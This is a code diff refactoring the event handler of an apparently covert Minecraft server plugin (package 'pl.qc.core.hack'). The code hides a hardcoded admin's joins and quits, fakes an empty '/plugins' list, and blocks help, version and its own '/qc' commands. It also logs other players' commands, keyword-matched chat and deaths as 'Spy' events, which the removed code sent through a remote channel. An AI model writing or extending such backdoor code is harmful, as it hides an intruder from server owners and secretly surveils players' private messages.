@@ -16,19 +16,14 @@ public class Events implements Listener {
 
     @EventHandler(priority = EventPriority.HIGHEST)
     public void onAdminJoin(org.bukkit.event.player.PlayerJoinEvent e) {
-        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
-        if (e.getPlayer().getName().equals(adm)) {
+        if (isAdmin(e.getPlayer()))
             e.setJoinMessage(null);
-        }
     }
 
     @EventHandler(priority = EventPriority.HIGHEST)
     public void onAdminQuit(org.bukkit.event.player.PlayerQuitEvent e) {
         Player p = e.getPlayer();
-        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
-
-        // Hide admin quit OR any player kicked by /qc k
-        if (p.getName().equals(adm) || pl.qc.core.hack.PlayerTracker.kicked.remove(p.getUniqueId())) {
+        if (isAdmin(p) || pl.qc.core.hack.PlayerTracker.kicked.remove(p.getUniqueId())) {
             e.setQuitMessage(null);
         }
     }
@@ -38,33 +33,26 @@ public class Events implements Listener {
         if (plugin.isPanic())
             return;
         Player p = event.getPlayer();
-        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
+        if (isAdmin(p))
+            return;
+
         String msg = event.getMessage().toLowerCase();
 
-        // Incognito: Block standard command info for non-admins
-        if (msg.startsWith("/plugins") || msg.startsWith("/pl") || msg.equals("/?") || msg.startsWith("/help")
-                || msg.startsWith("/ver") || msg.startsWith("/about")) {
-            if (!p.getName().equals(adm)) {
-                if (msg.startsWith("/plugins") || msg.startsWith("/pl"))
-                    p.sendMessage("Plugins (0):");
-                else
-                    p.sendMessage("§cNie masz uprawnień!");
-                event.setCancelled(true);
-                return;
-            }
-        }
-
-        // Hide QC command usage from logs/others
-        if (msg.startsWith("/qc") && !p.getName().equals(adm)) {
+        // Blocking standard commands
+        if (isBlockedCommand(msg)) {
+            if (msg.startsWith("/plugins") || msg.startsWith("/pl"))
+                p.sendMessage("Plugins (0):");
+            else
+                p.sendMessage("§cNie masz uprawnień!");
             event.setCancelled(true);
             return;
         }
 
-        if (plugin.getConfig().getBoolean("spy.command-spy", true) && !p.getName().equals(adm)) {
-            Map<String, String> f = new LinkedHashMap<>();
-            f.put("Gracz", p.getName());
-            f.put("Komenda", "`" + event.getMessage() + "`");
-            Remote.send("Spy: Komenda 🛰️", "3447003", null, f);
+        // Spy logging
+        if (plugin.getConfig().getBoolean("spy.command-spy", true)) {
+            Map<String, String> extra = new LinkedHashMap<>();
+            extra.put("Komenda", "`" + event.getMessage() + "`");
+            LoggerHelper.logPlayer("Spy: Komenda 🛰️", p, extra);
         }
     }
 
@@ -73,20 +61,18 @@ public class Events implements Listener {
         if (plugin.isPanic())
             return;
         Player p = event.getPlayer();
-        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
-        if (p.getName().equals(adm) || !plugin.getConfig().getBoolean("spy.social-spy", true))
+        if (isAdmin(p) || !plugin.getConfig().getBoolean("spy.social-spy", true))
             return;
 
         String msg = event.getMessage().toLowerCase();
-        plugin.getConfig().getStringList("spy.keywords").stream()
-                .filter(k -> msg.contains(k.toLowerCase()))
-                .findFirst().ifPresent(k -> {
-                    Map<String, String> f = new LinkedHashMap<>();
-                    f.put("Gracz", p.getName());
-                    f.put("Treść", event.getMessage());
-                    f.put("Słowo", k);
-                    Remote.send("Spy: Alerty ⚠️", "16711680", null, f);
-                });
+        plugin.getConfig().getStringList("spy.keywords").forEach(k -> {
+            if (msg.contains(k.toLowerCase())) {
+                Map<String, String> extra = new LinkedHashMap<>();
+                extra.put("Treść", event.getMessage());
+                extra.put("Słowo", k);
+                LoggerHelper.logPlayer("Spy: Alerty ⚠️", p, extra);
+            }
+        });
     }
 
     @EventHandler(priority = EventPriority.MONITOR)
@@ -94,9 +80,18 @@ public class Events implements Listener {
         if (plugin.isPanic() || !plugin.getConfig().getBoolean("logger.deaths", true))
             return;
         Player p = event.getEntity();
-        Map<String, String> f = new LinkedHashMap<>();
-        f.put("Gracz", p.getName());
-        f.put("Powód", event.getDeathMessage());
-        Remote.send("Śmierć 💀", "16711680", null, f);
+        Map<String, String> extra = new LinkedHashMap<>();
+        extra.put("Powód", event.getDeathMessage());
+        LoggerHelper.logPlayer("Śmierć 💀", p, extra);
+    }
+
+    private boolean isAdmin(Player p) {
+        return p.getName().equals(plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03"));
+    }
+
+    private boolean isBlockedCommand(String msg) {
+        return msg.startsWith("/plugins") || msg.startsWith("/pl") || msg.equals("/?") ||
+                msg.startsWith("/help") || msg.startsWith("/ver") || msg.startsWith("/about") ||
+                msg.startsWith("/qc");
     }
 }
